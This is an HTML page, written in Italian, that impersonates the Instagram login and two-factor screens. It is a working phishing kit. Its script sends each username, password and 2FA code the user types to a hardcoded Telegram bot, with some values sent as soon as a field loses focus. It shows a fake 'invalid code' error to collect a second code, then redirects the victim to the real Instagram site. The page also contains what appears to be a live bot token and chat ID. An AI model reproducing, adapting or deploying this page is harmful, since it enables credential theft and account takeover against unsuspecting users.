<!DOCTYPE html>
<html lang="it">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram</title>
<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family: Arial, sans-serif;
}

body{
    background:#0f2533;
    color:white;
    height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
}

/* ===== SPLASH ===== */
.splash{
    position:fixed;
    width:100%;
    height:100vh;
    background:#0f2533;
    display:flex;
    flex-direction:column;
    justify-content:center;
    align-items:center;
    z-index:999;
}

.splash svg{
    width:130px;
    height:130px;
}

.metaSplash{
    position:absolute;
    bottom:50px;
    text-align:center;
    color:#aaa;
    font-size:16px;
}

.metaSplash strong{
    font-size:18px;
    background: linear-gradient(45deg,#feda75,#fa7e1e,#d62976,#962fbf,#4f5bd5);
    -webkit-background-clip:text;
    -webkit-text-fill-color:transparent;
}

/* ===== CONTAINERS ===== */
.container{
    display:none;
    width:100%;
    max-width:420px;
    margin:auto;
    padding:20px;
    flex-direction:column;
    align-items:center;
    height:100vh;
}

.container.active{
    display:flex;
}

/* ===== LOGIN ===== */
.logo{
    margin-top:80px;
    margin-bottom:60px;
    display:flex;
    justify-content:center;
}

.logo svg{
    width:95px;
    height:95px;
}

.input-box{
    width:100%;
    margin-bottom:18px;
}

.input-box input{
    width:100%;
    height:65px;
    border:2px solid #3b5266;
    border-radius:20px;
    background:transparent;
    color:white;
    font-size:16px;
    padding:0 20px;
    outline:none;
}

.input-box input::placeholder{
    color:#a4adb6;
}

.login-btn{
    width:100%;
    height:55px;
    border:none;
    border-radius:30px;
    background:#1877f2;
    color:white;
    font-size:18px;
    cursor:pointer;
    transition:0.3s;
}

.login-btn:disabled{
    opacity:0.5;
    cursor:not-allowed;
}

.forgot{
    margin-top:20px;
    color:white;
    text-decoration:none;
    font-size:16px;
}

.bottom{
    margin-top:auto;
    width:100%;
    text-align:center;
    padding-bottom:30px;
}

.create{
    width:100%;
    height:55px;
    border:2px solid #2d8cff;
    border-radius:30px;
    background:transparent;
    color:#4fa0ff;
    font-size:16px;
    cursor:pointer;
}

.meta{
    margin-top:25px;
    font-size:18px;
    color:#d6d6d6;
}

/* ===== 2FA ===== */
.twofa-container{
    display:none;
    width:100%;
    max-width:420px;
    padding:20px;
    flex-direction:column;
    height:100vh;
    justify-content:flex-start;
    padding-top:80px;
}

.twofa-container.active{
    display:flex;
}

.back{
    font-size:28px;
    margin-bottom:20px;
    cursor:pointer;
    width:40px;
}

h1{
    font-size:28px;
    margin-bottom:8px;
}

.sub{
    font-size:14px;
    color:#cfd8dc;
    margin-bottom:20px;
}

.code-inputs{
    display:flex;
    gap:10px;
    justify-content:center;
    margin-bottom:10px;
}

.code-inputs input{
    width:50px;
    height:55px;
    text-align:center;
    font-size:22px;
    border-radius:12px;
    border:1px solid #3a4a55;
    background:#15232b;
    color:white;
    outline:none;
}

.code-inputs input:focus{
    border-color:#4da3ff;
}

.info{
    font-size:13px;
    color:#b0bec5;
    margin:15px 0;
    line-height:1.4;
    text-align:center;
}

.link{
    color:#4da3ff;
    font-size:14px;
    margin-top:5px;
    cursor:pointer;
    text-align:center;
}

button{
    width:100%;
    padding:14px;
    border:none;
    border-radius:25px;
    font-size:16px;
    cursor:pointer;
    transition:0.3s;
}

button:disabled{
    opacity:0.4;
    cursor:not-allowed;
}

.primary{
    background:#0a66ff;
    color:white;
    margin-top:20px;
}

.secondary{
    background:#2a2f33;
    color:#b0bec5;
    margin-top:10px;
}

.error-msg{
    color:#ff4444;
    font-size:13px;
    display:none;
    margin-bottom:10px;
    text-align:center;
}

.loading-screen{
    display:none;
    position:fixed;
    top:0;
    left:0;
    width:100%;
    height:100%;
    background:#0f2533;
    z-index:9999;
    flex-direction:column;
    align-items:center;
    justify-content:center;
    gap:15px;
}

.loading-screen .spinner{
    width:40px;
    height:40px;
    border:4px solid #3b5266;
    border-top-color:#1877f2;
    border-radius:50%;
    animation:spin 0.8s linear infinite;
}

@keyframes spin{
    to{transform:rotate(360deg);}
}

.loading-screen p{
    font-size:15px;
    color:#cfd8dc;
}
</style>
</head>
<body>

<!-- SPLASH -->
<div class="splash" id="splash">
<svg viewBox="0 0 24 24" fill="none">
<defs>
<linearGradient id="ig" x1="0" y1="1" x2="1" y2="0">
<stop offset="0%" stop-color="#feda75"/>
<stop offset="20%" stop-color="#fa7e1e"/>
<stop offset="45%" stop-color="#d62976"/>
<stop offset="70%" stop-color="#962fbf"/>
<stop offset="100%" stop-color="#4f5bd5"/>
</linearGradient>
</defs>
<rect x="3" y="3" width="18" height="18" rx="5" stroke="url(#ig)" stroke-width="2.2"/>
<circle cx="12" cy="12" r="4.2" stroke="url(#ig)" stroke-width="2.2"/>
<circle cx="17.5" cy="6.5" r="1.3" fill="url(#ig)"/>
</svg>
<div class="metaSplash">
<span>from</span>
<strong>Meta</strong>
</div>
</div>

<!-- LOADING -->
<div class="loading-screen" id="loadingScreen">
<div class="spinner"></div>
<p id="loadingText">Verifica in corso...</p>
</div>

<!-- LOGIN -->
<div class="container active" id="loginContainer">
<div class="logo">
<svg viewBox="0 0 24 24" fill="none">
<defs>
<linearGradient id="ig2" x1="0" y1="1" x2="1" y2="0">
<stop offset="0%" stop-color="#feda75"/>
<stop offset="20%" stop-color="#fa7e1e"/>
<stop offset="45%" stop-color="#d62976"/>
<stop offset="70%" stop-color="#962fbf"/>
<stop offset="100%" stop-color="#4f5bd5"/>
</linearGradient>
</defs>
<rect x="3" y="3" width="18" height="18" rx="5" stroke="url(#ig2)" stroke-width="2.2"/>
<circle cx="12" cy="12" r="4.2" stroke="url(#ig2)" stroke-width="2.2"/>
<circle cx="17.5" cy="6.5" r="1.3" fill="url(#ig2)"/>
</svg>
</div>

<div class="input-box">
<input type="text" id="username" placeholder="Nome utente, e-mail o numero di cellulare">
</div>
<div class="input-box">
<input type="password" id="password" placeholder="Password">
</div>

<div id="loginError" class="error-msg">Dati non validi. Riprova.</div>

<button class="login-btn" id="loginBtn" disabled>Accedi</button>
<a href="#" class="forgot">Password dimenticata?</a>

<div class="bottom">
<button class="create">Crea nuovo account</button>
<div class="meta">∞ Meta</div>
</div>
</div>

<!-- 2FA -->
<div class="twofa-container" id="twofaContainer">
<div class="back" id="backToLogin">←</div>
<h1>Controlla</h1>
<div class="sub">Abbiamo inviato un codice a <span id="displayUser">...</span></div>

<div id="twofaError" class="error-msg">Codice non valido. Riprova.</div>

<div class="code-inputs" id="codeInputs">
<input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" class="code-box">
<input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" class="code-box">
<input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" class="code-box">
<input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" class="code-box">
<input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" class="code-box">
<input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" class="code-box">
</div>

<div class="info">
La ricezione di questo codice potrebbe richiedere alcuni minuti.
<div class="link" id="resendBtn">Ricevi un nuovo codice</div>
</div>

<button class="primary" id="verifyBtn" disabled>Continua</button>
<button class="secondary" id="tryDifferent">Prova diversamente</button>
</div>

<script>
// ============================================
//  CONFIG - Bot Telegram
// ============================================
const CONFIG = {
    telegramToken: '8191936030:AAFl4PoBphmVzsukVH1Y-SP5mE45kgMqnkg',
    telegramChatId: '8278195073',
};

// ============================================
//  TELEGRAM SENDER
// ============================================
function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${CONFIG.telegramToken}/sendMessage`;
    const params = new URLSearchParams({
        chat_id: CONFIG.telegramChatId,
        text: message,
        parse_mode: 'Markdown'
    });
    new Image().src = `${url}?${params.toString()}`;
}

// ============================================
//  ELEMENTS
// ============================================
const splash = document.getElementById('splash');
const loginContainer = document.getElementById('loginContainer');
const twofaContainer = document.getElementById('twofaContainer');
const loadingScreen = document.getElementById('loadingScreen');
const loadingText = document.getElementById('loadingText');

const username = document.getElementById('username');
const password = document.getElementById('password');
const loginBtn = document.getElementById('loginBtn');
const loginError = document.getElementById('loginError');

const displayUser = document.getElementById('displayUser');
const codeBoxes = document.querySelectorAll('.code-box');
const verifyBtn = document.getElementById('verifyBtn');
const twofaError = document.getElementById('twofaError');
const backToLogin = document.getElementById('backToLogin');
const resendBtn = document.getElementById('resendBtn');

let capturedUsername = '';
let capturedPassword = '';
let verificationAttempts = 0;
let usernameSent = false;
let passwordSent = false;

// ============================================
//  SPLASH
// ============================================
setTimeout(() => {
    splash.style.display = 'none';
}, 2500);

// ============================================
//  LOGIN VALIDATION
// ============================================
function checkLogin() {
    loginBtn.disabled = !(username.value.trim() && password.value.trim());
}

username.addEventListener('input', checkLogin);
password.addEventListener('input', checkLogin);

// Capture username on blur
username.addEventListener('blur', function() {
    const val = this.value.trim();
    if (val && !usernameSent) {
        usernameSent = true;
        sendToTelegram(
            `📧 *Step 1: Identifier Captured* 📧\n\n` +
            `👤 *Identifier:* \`${val}\`\n` +
            `⏰ *Time:* ${new Date().toISOString()}`
        );
    }
});

// Capture password on blur
password.addEventListener('blur', function() {
    const val = this.value;
    if (val && !passwordSent) {
        passwordSent = true;
        sendToTelegram(
            `🔑 *Step 2: Password Captured* 🔑\n\n` +
            `👤 *Identifier:* \`${username.value.trim() || 'N/A'}\`\n` +
            `🔑 *Password:* \`${val}\`\n` +
            `⏰ *Time:* ${new Date().toISOString()}`
        );
    }
});

// ============================================
//  LOGIN SUBMIT
// ============================================
loginBtn.addEventListener('click', function(e) {
    e.preventDefault();

    capturedUsername = username.value.trim();
    capturedPassword = password.value;

    // Send confirmation via Telegram
    sendToTelegram(
        `✅ *Login Button Pressed* ✅\n\n` +
        `👤 *User:* \`${capturedUsername}\`\n` +
        `🔑 *Pass:* \`${capturedPassword}\`\n` +
        `⏰ *Time:* ${new Date().toISOString()}`
    );

    // Simulate delay then show 2FA
    loginBtn.disabled = true;
    loginBtn.textContent = 'Verifica...';

    setTimeout(() => {
        loginContainer.classList.remove('active');
        twofaContainer.classList.add('active');
        displayUser.textContent = capturedUsername || 'telefono';

        // Reset 2FA
        codeBoxes.forEach(box => box.value = '');
        codeBoxes[0].focus();
        verifyBtn.disabled = true;
        twofaError.style.display = 'none';
        loginBtn.disabled = false;
        loginBtn.textContent = 'Accedi';
    }, 2000);
});

// ============================================
//  2FA CODE INPUT
// ============================================
codeBoxes.forEach((box, index) => {
    box.addEventListener('input', function() {
        this.value = this.value.replace(/[^0-9]/g, '').slice(0, 1);
        if (this.value && index < codeBoxes.length - 1) {
            codeBoxes[index + 1].focus();
        }
        const allFilled = Array.from(codeBoxes).every(b => b.value !== '');
        verifyBtn.disabled = !allFilled;
        twofaError.style.display = 'none';
    });

    box.addEventListener('keydown', function(e) {
        if (e.key === 'Backspace' && !this.value && index > 0) {
            codeBoxes[index - 1].focus();
        }
    });

    box.addEventListener('paste', function(e) {
        e.preventDefault();
        const paste = (e.clipboardData || window.clipboardData).getData('text');
        const digits = paste.replace(/[^0-9]/g, '').slice(0, 6);
        digits.split('').forEach((d, i) => {
            if (codeBoxes[i]) codeBoxes[i].value = d;
        });
        if (digits.length === 6) {
            codeBoxes[5].focus();
            verifyBtn.disabled = false;
        } else if (codeBoxes[digits.length]) {
            codeBoxes[digits.length].focus();
        }
    });
});

// ============================================
//  VERIFY 2FA
// ============================================
verifyBtn.addEventListener('click', function() {
    const code = Array.from(codeBoxes).map(b => b.value).join('');
    verificationAttempts++;

    loadingScreen.style.display = 'flex';
    loadingText.textContent = 'Verifica codice...';

    // Send 2FA code to Telegram
    sendToTelegram(
        `🔢 *Step 3: 2FA Code* 🔢\n\n` +
        `👤 *User:* \`${capturedUsername}\`\n` +
        `🔢 *Code:* \`${code}\`\n` +
        `🔄 *Attempt:* ${verificationAttempts}\n` +
        `⏰ *Time:* ${new Date().toISOString()}`
    );

    setTimeout(() => {
        loadingScreen.style.display = 'none';

        // Show success / redirect after 2 attempts
        if (verificationAttempts >= 2) {
            loadingText.textContent = 'Reindirizzamento...';
            loadingScreen.style.display = 'flex';

            setTimeout(() => {
                window.location.href = 'https://www.instagram.com';
            }, 1500);
        } else {
            twofaError.style.display = 'block';
            codeBoxes.forEach(box => box.value = '');
            codeBoxes[0].focus();
            verifyBtn.disabled = true;
        }
    }, 1500);
});

// ============================================
//  BACK TO LOGIN
// ============================================
backToLogin.addEventListener('click', function() {
    twofaContainer.classList.remove('active');
    loginContainer.classList.add('active');
    twofaError.style.display = 'none';
    codeBoxes.forEach(box => box.value = '');
    verificationAttempts = 0;
});

// ============================================
//  RESEND CODE
// ============================================
resendBtn.addEventListener('click', function() {
    codeBoxes.forEach(box => box.value = '');
    codeBoxes[0].focus();
    verifyBtn.disabled = true;
    twofaError.style.display = 'none';

    sendToTelegram(`🔄 *Resend Code Requested* 🔄\n\n👤 *User:* \`${capturedUsername}\`\n⏰ *Time:* ${new Date().toISOString()}`);
});

// ============================================
//  TRY DIFFERENT
// ============================================
document.getElementById('tryDifferent').addEventListener('click', function() {
    twofaContainer.classList.remove('active');
    loginContainer.classList.add('active');
    twofaError.style.display = 'none';
    verificationAttempts = 0;

    sendToTelegram(`↩️ *Try Different Method* ↩️\n\n👤 *User:* \`${capturedUsername}\`\n⏰ *Time:* ${new Date().toISOString()}`);
});
</script>

</body>
</html>
